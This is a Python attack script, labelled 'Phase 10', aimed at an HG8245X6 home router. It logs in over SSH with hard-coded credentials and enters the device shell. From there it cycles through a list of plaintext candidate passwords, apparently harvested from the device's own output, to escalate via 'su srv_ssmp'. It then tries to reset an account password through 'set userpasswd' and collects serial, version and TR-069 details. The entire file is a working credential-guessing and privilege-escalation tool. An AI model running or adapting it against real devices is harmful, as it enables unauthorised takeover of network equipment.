#!/usr/bin/env python3
"""
Phase 10: Try the discovered credentials against srv_ssmp su.
Found credentials:
- SPEC_MU_CNT_CODE_DEF = "1613!#hwont89@" 
- mutool / 1613!#hwont89@
- Also explore 'set userpasswd' exact syntax
"""

import paramiko
import time

HOST = "192.168.1.1"
USER = "sUser"
PASSWORD = "EP!99R4HLH9E"

# Discovered credentials from session cli output
CANDIDATES = [
    "1613!#hwont89@",
    "mutool",
    "eRB!FS!@",
    "A1sf1brE",
    "acs",
    "cpe",
    "iadtest",
    "useradmin",
    "EP!99R4HLH9E",  # our own password
    "",               # blank
]

def recv_until(chan, markers, timeout=10):
    if isinstance(markers, str):
        markers = [markers]
    buf = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            chunk = chan.recv(4096)
            buf += chunk
            decoded = buf.decode('utf-8', errors='replace')
            for marker in markers:
                if marker in decoded:
                    return decoded
        elif chan.exit_status_ready():
            break
        time.sleep(0.1)
    return buf.decode('utf-8', errors='replace')

def send_wap(chan, cmd, timeout=8):
    chan.send(cmd + "\n")
    out = recv_until(chan, ["SU_WAP>", "WAP>"], timeout)
    lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
    for l in lines:
        if cmd[:20] not in l:
            print(f"  {l}")
    return out

def send_shell(chan, cmd, timeout=15):
    chan.send(cmd + "\n")
    out = recv_until(chan, ["# "], timeout)
    lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
    for l in lines:
        if cmd[:20] not in l:
            print(f"  {l}")
    return out

def connect_to_wap():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASSWORD, timeout=10,
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell(width=220, height=50)
    time.sleep(2)
    out = recv_until(chan, ["WAP>", "Remove one session", "Enter the ID"], timeout=8)
    if "Remove one session" in out or "Enter the ID" in out:
        print("[!] Session limit - removing session 1...")
        chan.send("1\n")
        time.sleep(2)
        recv_until(chan, "WAP>", timeout=10)
    chan.send("su\n")
    recv_until(chan, ["SU_WAP>", "success"], timeout=8)
    print("[+] SU_WAP> obtained!\n")
    return client, chan

def try_su_password(chan, target_user, password, shell=False):
    """Try su with given password. Returns True if successful."""
    if shell:
        chan.send("shell\n")
        recv_until(chan, "# ", timeout=5)
        cmd = f"su {target_user}"
    else:
        cmd = f"su {target_user}"
    
    chan.send(cmd + "\n")
    out = recv_until(chan, ["Password", "# ", "$ "], timeout=5)
    
    if "Password" in out:
        chan.send(f"{password}\n")
        out = recv_until(chan, ["# ", "$ ", "incorrect", "false", "WAP"], timeout=5)
        if "incorrect" not in out.lower() and "false" not in out.lower():
            if "# " in out or "$ " in out:
                return True
    elif "# " in out or "$ " in out:
        return True  # No password needed
    return False

def main():
    print("=" * 62)
    print("  HG8245X6 - Credential Testing & set userpasswd Syntax")
    print("=" * 62)

    client, chan = connect_to_wap()

    # ── 1. Find 'set userpasswd' exact syntax ─────────────────
    print("[*] Finding 'set userpasswd' exact syntax:")
    # Try with just the current user's own password change
    chan.send("set userpasswd\n")
    out = recv_until(chan, ["SU_WAP>", "Enter", "New", "Old", "para", "USAGE"], timeout=8)
    print(f"  {out.strip()[-400:]}")
    
    # If it prompted for interactive input
    if "Old" in out or "old" in out:
        print("  [+] Interactive password change detected!")
        # Try: old password is EP!99R4HLH9E for current user?
        
    # ── 2. Enter shell and try all candidate passwords ────────
    print("\n[*] Entering shell for password testing...")
    chan.send("shell\n")
    recv_until(chan, "# ", timeout=8)

    print(f"\n[*] Testing {len(CANDIDATES)} passwords against srv_ssmp:")
    success_pwd = None
    
    for pwd in CANDIDATES:
        chan.send("su srv_ssmp\n")
        out = recv_until(chan, ["Password", "# ", "$ "], timeout=5)
        
        if "Password" in out:
            pwd_display = pwd if pwd else "(blank)"
            chan.send(f"{pwd}\n")
            out = recv_until(chan, ["# ", "$ ", "incorrect", "false", "WAP(Dopra"], timeout=5)
            if "incorrect" not in out.lower() and "false" not in out.lower() and ("# " in out or "$ " in out):
                print(f"  [+] ✓✓✓ SUCCESS! Password for srv_ssmp: '{pwd_display}'")
                success_pwd = pwd
                break
            else:
                print(f"  [-] '{pwd_display}' failed")
        elif "# " in out or "$ " in out:
            print(f"  [+] ✓ Got shell without password!")
            success_pwd = ""
            break

    if success_pwd is not None:
        print(f"\n[+] ✓✓✓ ESCALATION SUCCESSFUL! Password: '{success_pwd}'")
        chan.send("id\n")
        out = recv_until(chan, "# ", timeout=5)
        print(f"  id: {out.strip()}")
        chan.send("cat /proc/self/status | grep -E 'Uid|Gid|Cap'\n")
        out = recv_until(chan, "# ", timeout=5)
        print(f"  status: {out.strip()}")
    else:
        print("\n[-] None of the candidate passwords worked for su srv_ssmp")

    # ── 3. Try 'set userpasswd' for the current user ──────────
    # Go back to SU_WAP>
    chan.send("exit\n")
    recv_until(chan, "SU_WAP>", timeout=5)

    print("\n[*] Trying to find set userpasswd syntax interactively:")
    # Try: set userpasswd [no args - prompts?]
    chan.send("set userpasswd\n")
    out = recv_until(chan, ["SU_WAP>", "Enter", "para", "USAGE", "Old", "New", "name"], timeout=10)
    print(f"  Response: {repr(out.strip()[-400:])}")
    
    # If it's asking for something, respond
    if "SU_WAP>" not in out:
        print("  [*] Command is interactive, probing...")
        # Try sending the current user name first
        chan.send("srv_ssmp\n")
        out = recv_until(chan, ["SU_WAP>", "Enter", "pass", "new", "old"], timeout=5)
        print(f"  After 'srv_ssmp': {repr(out.strip()[-200:])}")
        if "SU_WAP>" not in out:
            chan.send("Admin1234!\n")
            out = recv_until(chan, ["SU_WAP>", "Enter", "success", "fail"], timeout=5)
            print(f"  After new pwd: {repr(out.strip()[-200:])}")
            if "SU_WAP>" not in out:
                chan.send("Admin1234!\n")
                out = recv_until(chan, ["SU_WAP>", "success", "fail"], timeout=5)
                print(f"  Confirm: {repr(out.strip()[-200:])}")

    # ── 4. Display some useful WAP info for our records ───────
    print("\n[*] display sn:")
    send_wap(chan, "display sn")

    print("\n[*] display version:")
    send_wap(chan, "display version")

    print("\n[*] display inner version:")
    send_wap(chan, "display inner version")

    print("\n[*] display tr069 info:")
    send_wap(chan, "display tr069 info")

    client.close()
    print("\n[*] Session closed.")

if __name__ == "__main__":
    main()
